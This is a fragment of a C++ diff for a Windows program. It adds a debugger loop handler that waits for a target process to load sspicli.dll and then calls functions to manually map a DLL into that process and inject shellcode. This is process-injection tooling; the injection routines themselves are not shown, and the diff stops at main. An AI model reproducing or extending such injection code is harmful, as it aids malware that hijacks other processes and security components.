@@ -1,7 +1,38 @@
 #include <Windows.h>
 #include <stdio.h>
-#include "includes.hpp"
+#include "Mmap.hpp"
 
+#define BUFSIZE MAX_PATH
+
+bool find_dll(const char* target, char* path)
+{
+    auto target_len = strlen(target);
+    auto dll_name = (path + (strlen(path))) - target_len;
+    if (stricmp(target, dll_name)) return false;
+    return true;
+}
+
+void process_debugevent(DEBUG_EVENT& de, PROCESS_INFORMATION& pi)
+{
+    switch (de.dwDebugEventCode)
+    {
+    case LOAD_DLL_DEBUG_EVENT:
+        
+        {
+            char Path[BUFSIZE];
+            GetFinalPathNameByHandleA(de.u.LoadDll.hFile, Path, BUFSIZE, 0);
+            if(!find_dll("sspicli.dll", Path)) break;
+            inject_shellcode(pi, mapp_dll(pi));
+        }
+
+        break;
+    
+    default:
+        break;
+    }
+
+    ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
+}
 
 
 int main()
